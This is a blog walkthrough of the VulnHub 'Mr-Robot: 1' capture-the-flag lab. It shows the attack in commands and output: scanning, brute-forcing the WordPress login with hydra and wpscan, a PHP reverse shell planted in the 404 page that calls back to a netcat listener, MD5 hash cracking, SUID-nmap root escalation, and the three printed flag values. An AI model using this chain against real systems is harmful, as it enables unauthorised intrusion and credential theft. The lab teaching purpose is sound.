---
layout: post
title: "Mr. Robot"
date: 2022-04-12 20:50:57 +0200
categories: VulnHub
tags: VulnHub Walkthrough WordPress Nmap Metasploit Tag1 Tag2 Tag3 Tag4 Tag5 Tag6 Tag7 Tag8 Tag9 Tag10
image: "assets/images/binary.jpg"
excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras nulla nisi, gravida eget lacus sed, feugiat rhoncus lectus. Maecenas condimentum rutrum dolor, ut ultrices risus tempor vel. Mauris sed iaculis elit, id efficitur nulla. Morbi vitae purus et eros venenatis hendrerit quis non nibh. Suspendisse est turpis, ultricies et ipsum et, semper tincidunt ex. Phasellus accumsan enim nec arcu mollis ultricies. Suspendisse congue mi diam, ut auctor turpis faucibus ut."
---

[Mr. Robot](https://www.imdb.com/title/tt4158110/) is one of the greatest TV shows ever made, and it is the most authentic representation of actual real life hacking to this day.
[Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.

## Preparation & Enumeration

The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.<br>
On the isolated internal network, the VirtualBox DHCP server assigns IP addresses to the machines:

```sh
marci@arch$ vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```

The **Kali** machine received the IP address `10.38.1.110`.

Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.

![mr_robot](https://www.dropbox.com/s/rftjad3vikt9yyp/mr_robot.jpg?dl=1)


### Nmap

**Nmap** can be used to discover the vulnerable machine on the network:

```sh
kali@kali$ nmap -sS -T4 10.38.1.110-120
```

```sh
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 15:04 EDT
Nmap scan report for 10.38.1.110
Host is up (0.0000060s latency).
All 1000 scanned ports on 10.38.1.110 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap scan report for 10.38.1.111
Host is up (0.00050s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:FE:07:51 (Oracle VirtualBox virtual NIC)

Nmap done: 11 IP addresses (2 hosts up) scanned in 32.14 seconds
```

**Nmap** found the vulnerable machine and reported it with the IP address `10.38.1.111`.<br>
Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=80) and [443](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=443) are well-known ports used to establish connection with **web servers**.<br>
Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).

![fsociety](https://www.dropbox.com/s/mh5v8lc88k9r8tx/fsociety.png?dl=1)

Checking the displayed commands won't get us anywhere close to the first flag.

## Flag One

### Nikto

**Nikto** can be used to gather further information about the web server.

```sh
kali@kali$ nikto -h 10.38.1.111
```

```
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 19 item(s) reported on remote host
```
**Nikto** has discovered that the server is running an instance of **WordPress**.

![wordpress](https://www.dropbox.com/s/qfke2r46f8cjcgc/wplogin.jpg?dl=1)

**Nikto** also indicates that the server leaks inodes via ETags and a header has been found with file `/robots.txt`.

```sh
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.38.1.111
+ Target Hostname:    10.38.1.111
+ Target Port:        80
+ Start Time:         2022-04-07 15:29:21 (GMT-4)
---------------------------------------------------------------------------
+
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0.29 0x52467010ef8ad
```

### Robots.txt

> A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
> This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.

`robots.txt` indicates that the server doesn't have an user agent, but it has two files:

![robots](https://www.dropbox.com/s/wqomn14tb6zo8qx/robots.png?dl=1)

These files can be downloaded with **wget**:

```sh
kali@kali$ wget 10.38.1.111/fsocity.dic
kali@kali$ wget 10.38.1.111/key-1-of-3.txt
```

We can use **cat** to output the content of `key-1-of-3.txt`:

```sh
kali@kali$ cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

## Flag Two

As SSL isn't enabled on the WordPress login page, it may be brute forced with the previously acquired dictionary file.

`fsocity.dic` contains duplicated entries that should be removed.

```sh
kali@kali$ cat fsocity.dic | sort -u | uniq > wordlist.dic
```

The word count of `fsocity.dic` has decreased from `858160` to `11451`.

```
kali@kali$ wc -l fsocity.dic
858160 fsocity.dic
```

```
kali@kali$ wc -l wordlist.dic
11451 wordlist.dic
```

### POST request

To start the brute force attack, we need to intercept an http POST request in [Burp Suite](https://portswigger.net/burp).


> The [POST request](https://en.wikipedia.org/wiki/POST_(HTTP)) method requests that a web server accept the data enclosed in the body of the request message, most likely for storing it.
> It is often used when uploading a file or when submitting a completed web form _(e.g. login form)_.

To do that, a manual proxy must be configured in the browser (FireFox) and Burp Suite should have the same proxy listener set:

![proxy-browser](https://www.dropbox.com/s/gmy9hh0pjqyqwgz/proxy.jpg?dl=1)

![proxy-burpsuite](https://www.dropbox.com/s/5256rk1t5vthmws/burpsuite-proxy.png?dl=1)

To intercept the http POST request, I have filled the WordPress login form with random credentials:

- **Username**: Test
- **Password**: Password123

![burpsuite](https://www.dropbox.com/s/a6ay1bq6thlap7m/burpsuite.png?dl=1)

In the intercepted POST request - that has been sent to the server - we're interested in the `log`, `pwd`, and the `wp-submit` fields.

### Hydra

Based on the captured http POST request, we can use **hydra** to guess the username:

```sh
kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

<details>
<summary>Explain this command</summary>

<table>
  <tr>
    <td>-V</td>
    <td>Verbose</td>
  </tr>
  <tr>
    <td>-L fsocity.dic</td>
    <td>Define dictionary</td>
  </tr>
  <tr>
    <td>-p 123</td>
    <td>Random unique password</td>
  </tr>
  <tr>
    <td>10.38.1.111</td>
    <td>IP of the vulnerable machine</td>
  </tr>
  <tr>
    <td>http-post-form</td>
    <td>An http POST form is being brute forced</td>
  </tr>
  <tr>
    <td>/wp-login.php</td>
    <td>Path where the login form is located</td>
  </tr>
  <tr>
    <td>log=^USER^&pwd=^PASS&wp-submit=Log+In</td>
    <td>POST parameters to send, including placeholders</td>
  </tr>
  <tr>
    <td>F=Invalid Username</td>
    <td>Consider an attempt as failure if the response contains the text "Invalid Username".</td>
  </tr>
</table>

</details>

**hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.

```sh
[80][http-post-form] host: 10.38.1.111 login: elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: Elliot password: 123
[80][http-post-form] host: 10.38.1.111 login: ELLIOT password: 123
```

### WPScan

**WPScan** can be used to find additional WordPress vulnerabilities and to brute force the password using the word list.

```sh
kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
```

```sh
[+] performing password attach on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot - / ER28-0652
All Found
Progress Time: 00:00:19 <========================================================================

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```

**WPScan** has found several outdated plugins and one valid username - password pair.<br>
Testing the credentials, we can log in to the WordPress administration interface indeed.

### Reverse shell

> A **reverse shell** is a shell session established on a connection that is initiated from the victim's remote machine, not from the attacker’s host.
> Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session (for gaining access) on the target machine.

I've downloaded a basic PHP reverse shell code from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).<br>
Prior to uploading the PHP code, the attacking machine's IP address must be assigned to the `$ip` variable.

```php
$ip = '10.38.1.110';  // CHANGE THIS
```

As we can log in to the WordPress site with the acquired credentials, the PHP reverse shell code can be included in a PHP file that already exists.<br>
I have replaced PHP code in the site's 404 page - loading the 404 page, will now will execute the PHP reverse shell code.

> [404](https://en.wikipedia.org/wiki/HTTP_404) is an HTTPS standard response code, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.

**netcat** is being used to listen to every incoming connections on port `1234`.

```sh
kali@kali$ netcat -lvp 1234
listening on [any] 1234 ...
```

To start the reverse shell, the 404 page can be called with **curl** in another terminal instance.

```sh
kail@kali$ curl http://10.38.1.111/404.php
```

!!!!!!!!!!!!!!!!!

```sh
10.38.1.111: inverse host lookup failed: Host name lookup failure
connect to [10.38.1.110] from (UNKNOWN) [10.38.1.111] 41282
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 02:06:59 up 1 min,  0 users,  load average: 0.03, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

Entering the `id` command, we can see that we're logged in as a daemon and not as an actual user.
This means that our current session does not have any permission (e.g. to read or to modify files).

```sh
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> A [daemon](https://en.wikipedia.org/wiki/Daemon_(computing)) is a computer program that runs as a background process, rather than being under the direct control of an interactive user.

After checking our user's home directory, we can find two files that could be interesting for us.

```sh
$ cd /home/robot
```
```sh
$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

```

Taking a glance at the file permissions, it is clearly visible that `key-2-of-3.txt` is only available to read for the user named `robot`.<br>
To prove this, we can try to output the content of the file.

```sh
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

To get our hands on the second key, we need to perform a privilege escalation and become the root user.<br>
Interestingly, the content of `passowrd.raw-md5` can be read, and it looks like an unsalted MD5 hashed password.

```sh
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

To crack this hash, we can either use [hashcat](https://hashcat.net/hashcat/)  or [CrackStation.net](https://crackstation.net) that is a free online hash cracking tool.

### hashcat

I have decided to go with **hashcat** - it is the default tool built into Kali Linux.

```sh
kali@kali$ hashcat -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt.gz -o result.txt
```

<details>
<summary>Explain this command</summary>

<table align ="center">
  <tr>
    <td>-a 0</td>
    <td>Attack mode: 0 - Straight</td>
  </tr>
  <tr>
    <td>-m 0</td>
    <td>Hash type: 0 - MD5</td>
  </tr>
  <tr>
    <td>password.md5</td>
    <td>Password file where the hash is placed</td>
  </tr>
  <tr>
    <td>/usr/share/wordlists/rockyou.txt.gz</td>
    <td>RockYou password list</td>
  </tr>
  <tr>
    <td>-o result.txt</td>
    <td>Define output file</td>
  </tr>
</table>

</details>


```sh
cat result.txt
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Now, we can log in as the Superuser with the acquired password.

```sh
$ su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$
```

As we have Superuser privileges, `key-2-of-3.txt` becomes readable.

```sh
robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## Flag Three

Given that there is only one flag left, and we have not got root access to this box yet, this would have to be the next logical step.

> The [root account](https://www.ibm.com/docs/en/aix/7.2?topic=passwords-root-account) is a special user in the `/etc/passwd` file with the User ID (UID) of 0 that has virtually unlimited access to all programs, files, and resources on a system.

### Privilege Escalation

To elevate our privileges, we might have to search for binaries - with the `find` command - that we can run interactively and with the SUID bit set.

> [SUID bit](https://en.wikipedia.org/wiki/Setuid) is a Linux file permission setting that allows a user to execute a file or program with the permission of the owner of that file.

```sh
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

<details>
<summary>Explain this command</summary>

<table align ="center">
  <tr>
    <td>find</td>
    <td>Search for files in a directory hierarchy</td>
  </tr>
  <tr>
    <td>/</td>
    <td>Search in the root directory (/)</td>
  </tr>
  <tr>
    <td>-perm -4000</td>
    <td>Permission bits mode are set (setuid bit set)</td>
  </tr>
  <tr>
    <td>2>/dev/null</td>
    <td>Redirect STDERR to null device to throw away error messages</td>
  </tr>
</table>

</details>

From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.<br>
The `nmap --help` command tells us that **nmap** has a `--interactive` option.

```sh
robot@linux:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```

Nmap's help indicates that we can run shell commands in the foreground.

```sh
nmap> h
```
```sh
! <command>   -- runs shell command given in the foreground
```

We can use this option to our advantage and spawn a root shell.

```sh
nmap> !sh
!sh
# whoami
root
```

Now, that we have root privileges, we can check out what is inside the `/root` folder.

```sh
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
```

```sh
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

## Summary

Mr. Robot is a great introduction to test our basic web application penetration testing skills: reconnaissance with Nmap, http POST request capturing with Burp Suite, password cracking using bute force dictionary attack, establishing a reverse shell connection, and escalating privileges to gain root access.

```sh
cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

```sh
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

```sh
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
